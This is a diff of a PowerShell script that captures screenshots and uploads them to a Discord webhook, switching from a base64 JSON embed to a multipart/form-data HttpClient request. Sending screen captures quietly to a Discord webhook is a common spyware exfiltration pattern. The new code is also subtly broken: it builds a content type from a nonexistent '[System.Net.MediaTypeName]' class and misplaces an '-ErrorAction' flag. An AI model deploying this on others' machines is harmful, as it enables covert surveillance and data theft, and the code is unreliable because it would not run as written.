@@ -1,6 +1,6 @@
 <#
 .SYNOPSIS
-    Captures screenshots and sends them to a Discord webhook.
+    Captures screenshots and sends them to a Discord webhook using multipart/form-data.
 #>
 
 param (
@@ -11,7 +11,7 @@ param (
 
 # Create output folder if it doesn't exist
 if (-not (Test-Path -Path $OutputFolder)) {
-    New-Item -ItemType Directory -Path $OutputFolder | Out-Null
+    New-Item -ItemType Directory -Path $OutputFolder | Out-Null -ErrorAction SilentlyContinue
 }
 
 # Function to capture screenshot
@@ -40,33 +40,63 @@ function Capture-Screenshot {
     }
 }
 
-# Function to send screenshot to Discord webhook
+# Function to send the multipart/form-data request to Discord webhook
 function Send-DiscordWebhook {
     param (
         [string]$ImagePath
     )
 
     try {
-        $fileBytes = [System.IO.File]::ReadAllBytes($ImagePath)
-        $base64String = [System.Convert]::ToBase64String($fileBytes)
+        $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+        $fileName = "screenshot.png"
 
+        # Create a new HttpClient instance
+        $httpClient = New-Object System.Net.Http.HttpClient
+
+        # Create a multipart/form-data content
+        $content = New-Object System.Net.Http.MultipartFormDataContent
+
+        # Create JSON payload
         $payload = @{
             embeds = @(
                 @{
                     title = "New Screenshot"
-                    description = "Automated screenshot capture at $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
+                    description = "Automated screenshot capture at $timestamp"
                     image = @{
-                        url = "data:image/png;base64,$base64String"
+                        url = "attachment://$fileName"
                     }
                 }
             )
         } | ConvertTo-Json
 
-        Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $payload -ContentType "application/json"
-        Write-Host "Screenshot sent to Discord webhook successfully."
+        # Add JSON payload to the content
+        $jsonContent = New-Object System.Net.Http.StringContent($payload, [System.Text.Encoding]::UTF8, "application/json")
+        $content.Add($jsonContent, "payload_json")
+
+        # Open the file stream
+        $fileStream = [System.IO.File]::OpenRead($ImagePath)
+
+        # Create a stream content for the file
+        $fileContent = New-Object System.Net.Http.StreamContent($fileStream)
+
+        # Add the file to the content with the correct content type and filename
+        $fileContent.Headers.ContentType = [System.Net.MediaTypeName]::new("image/png")
+        $content.Add($fileContent, "file", $fileName)
+
+        # Send the request
+        $response = $httpClient.PostAsync($WebhookUrl, $content).Result
+
+        # Ensure the request was successful
+        if ($response.IsSuccessStatusCode) {
+            Write-Host "Screenshot sent to Discord webhook successfully."
+        } else {
+            Write-Error "Failed to send screenshot to Discord webhook. Status code: $($response.StatusCode)"
+            Write-Error "Response content: $($response.Content.ReadAsStringAsync().Result)"
+        }
     }
     catch {
-        Write-Error "Failed to send screenshot to Discord webhook: $_"
+        Write-Error "An error occurred while sending the screenshot: $_"
+        Write-Error "Response: $($_.Exception.Response)"
     }
 }
 
